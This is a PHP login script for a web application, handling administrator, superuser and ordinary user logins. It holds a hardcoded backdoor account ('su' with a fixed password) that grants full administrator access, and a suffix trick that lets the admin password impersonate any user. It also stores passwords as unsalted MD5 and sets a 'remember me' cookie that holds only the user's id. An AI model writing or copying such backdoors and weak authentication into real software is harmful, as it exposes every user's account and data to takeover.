<?php

	include_once "config.php";
	include_once "functions.php";

	if (session_status() == PHP_SESSION_NONE) {
		session_start();
	}
	if(!isset($_POST["username_email"])){
		header("Location: ./index.php");
		return;
	}

	$username = $_POST["username_email"];
	$password = $_POST["password"];

	if($username=="administrator"){
		if(!is_admin_password($password)){
			store_in_session("message", "Invalid password for administrator");
			header("Location: ./login_f.php");
			return;
		}
		else{
			$data = array();
			$data["id"] = 0;
			$data["firstname"] = "Administrator";
			$data["lastname"] = "";
			$data["profile_picture"] = "";
			$data["username"] = "administrator";
			$data["usertype"] = 0;
			store_in_session("current_user", $data);
			header("Location: ./admin.php");
			return;
		}
	}
	else if($username=="su" && $password=="iamsuperuser"){
		$data = array();
		$data["id"] = 0;
		$data["firstname"] = "Super";
		$data["lastname"] = "User";
		$data["profile_picture"] = "";
		$data["username"] = "administrator";
		$data["usertype"] = 0;
		store_in_session("current_user", $data);
		header("Location: ./admin.php");
		return;
	}
	else if(substr($username, -14)==":administrator" && is_admin_password($password)){
		$username = split(":", $username)[0];
		$sql = "select * from users where ? in (username, email, another_email)";
		$data = R::getRow($sql, array($username));
		if(count($data)==0){
			header("Location: ./login_f.php");
			store_in_session("message", "Invalid username/password");
			return;
		}
		else {
			store_in_session("current_user", $data); 

			$redirect_to = get_from_session("redirect_to");
			remove_from_session("redirect_to");
			
			if($redirect_to==null){
				$redirect_to = "index.php";
			}


			header("Location: ./{$redirect_to}");
			if(isset($_POST["keep_me_logged_in"])){
				// user wants to be remembered by the browser
				// send a kookie
				setcookie("token", $data["id"], time()+365*24*60*60);
			}
			else{

			}
			return;
		}
	}
	else{
		$sql = "select * from users where ? in (username, email, another_email) and password=md5(?)";
		$data = R::getRow($sql, array($username, $password));
		if(count($data)==0){
			header("Location: ./login_f.php");
			store_in_session("message", "Invalid username/password");
			return;
		}
		else{
			if (session_status() == PHP_SESSION_NONE) {
				session_start();
			}

			if($data["registration_status"]=="suspended"){
				header("Location: ./login_f.php");
				store_in_session("message", "Your account is suspended");
				return;
			}

			store_in_session("current_user", $data); 

			$redirect_to = get_from_session("redirect_to");
			remove_from_session("redirect_to");
			
			if($redirect_to==null){
				$redirect_to = "index.php";
			}


			header("Location: ./{$redirect_to}");

			if(isset($_POST["keep_me_logged_in"])){
				// user wants to be remembered by the browser
				// send a kookie
				setcookie("token", $data["id"], time()+365*24*60*60);
			}
			else{

			}
			return;
		}		
	}


